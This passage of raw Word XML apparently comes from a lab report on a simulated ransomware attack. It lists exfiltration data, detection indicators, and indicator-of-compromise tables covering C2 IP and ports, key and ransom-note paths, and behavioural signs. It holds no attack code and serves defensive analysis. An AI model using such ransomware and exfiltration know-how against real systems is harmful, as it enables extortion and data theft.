        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>BLOCKED</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> (expected in simulation)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D35422C"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Exfiltration Data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F389362"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="387B0B1E"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"victim": "20251215_201412",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="636642C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"files": 6,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="651BE38B"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spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>key</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>_sample</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>": "gAAAAABnXy8kGxM4H..."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79F527E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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D07E184"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lastRenderedPageBreak/>
        <w:t>Detection Indicators:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42636BAE" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Unusual outbound HTTP traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B26CD2C" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Large data transfers to external IPs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A99FE75" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324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Connections to suspicious ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20C39085"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Risk Assessment:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> Modern ransomware groups often exfiltrate data before encryption to enable double extortion ("pay or we leak your data").</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="098BF2C5"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58ED28BC" w14:textId="63B96722"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A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>5. INDICATORS OF COMPROMISE (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>IoCs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D40A4D7" w14:textId="71C85C96"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5.1 Network Indicator</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1580"/>
        <w:gridCol w:w="3681"/>
      </w:tblGrid>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="71775713" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="54009F33"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Indicator Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="36E8523A"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Value</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="09A747BA"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Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="36F71712" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A547010"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Source IP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="645BC889"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192.168.100.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="30292ED9"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Compromised host</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="48F84EED" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="403CD805"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C2 Server IP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7938006B"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192.168.100.20</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="74750972"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Command &amp; Control</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="0B9AAE26" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="78F8C551"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C2 Port 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7AB6B1DA"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31337</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4DD1FB18"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Elite/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BD172D">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="ru-KZ"/>
              </w:rPr>
              <w:t>Leet</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BD172D">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="ru-KZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> port (common in malware)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="0B801370" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4817A6E5"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C2 Port 2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E6A76C8"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8888</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="655BBD75"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Alternative C2 port</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="2B48D565" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B7672AC"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Exfil Port</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1A1A1929"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8080</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="76440A37"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HTTP exfiltration endpoint</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="17396924" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="242F4F72"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Protocol</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="46079464"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TCP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2BD4A136"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C2 and exfil communication</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1083395C"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5.2 File System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hemeFill="background2"/>
        <w:tblCellMar>
          <w:top w:w="15" w:type="dxa"/>
          <w:left w:w="15" w:type="dxa"/>
          <w:bottom w:w="15" w:type="dxa"/>
          <w:right w:w="15" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1701"/>
        <w:gridCol w:w="3166"/>
        <w:gridCol w:w="2201"/>
      </w:tblGrid>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="3ECE94F7" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="153C4981"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Indicator Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="44DC8D7D"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Value</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5C2CD404"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Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="5090060D" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="163596B5"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Encryption Key</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="20E36277"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/home/kali/test/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BD172D">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="ru-KZ"/>
              </w:rPr>
              <w:t>decrypt_key.key</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E45385C"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Fernet encryption key</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="60518A88" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4044F864"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Ransom Note</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="30F9DBBC"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/home/kali/test/README.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C6F991B"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Ransom demand</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="4370E4A7" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="333C68A3"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Target Directory</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F86F7E7"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/home/kali/test/</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="67E125B8"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Files encrypted</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="7678F0F5" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D00A838"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File Extensions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7D42461B"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Original preserved</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72886ADF"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No extension change</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="27DBE425" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="18C0E243"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File Size Pattern</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3AB4F689"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+400 bytes overhead</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEECE1" w:themeFill="background2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B62C993"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Encryption metadata</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="39CC2DD1"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5.3 Behavioral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3360"/>
        <w:gridCol w:w="1202"/>
      </w:tblGrid>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="11FA5307" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6906849D"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Behavior</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3A1A6522"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Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="21A6AAFC" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC" w:rsidP="00364226">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>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Risk Level</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="2A5233A4" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B4FDFFA"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Rapid enumeration commands</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="525048A5"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5 recon commands in 2 seconds</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6CFFBF13"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HIGH</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="761FCD86" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2E93D83F"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Non-interactive execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="78DBAF2B"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Commands run without user input</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1EDBED00"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HIGH</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="749B1B76" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3D1C742F"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Mass file modifications</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="07A1F523"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6 files changed in &lt;2 seconds</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B45ECD2"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CRITICAL</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="2FA57849" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7D7982B6"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Outbound connections</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="39988245"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Multiple C2 connection attempts</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2ACA582D"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CRITICAL</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C324AC" w:rsidRPr="00BD172D" w14:paraId="7F1BB6EA" w14:textId="77777777" w:rsidTr="00364226">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7A045C5C"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Encryption activity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14583F71"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Symmetric encryption operations</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="18869C02" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC" w:rsidP="00364226">
            <w:pPr>
              <w:spacing w:after="0"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CRITICAL</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="65452611"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lastRenderedPageBreak/>
        <w:t>5.4 Unique Identifiers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28D24C25"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Attack ID:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
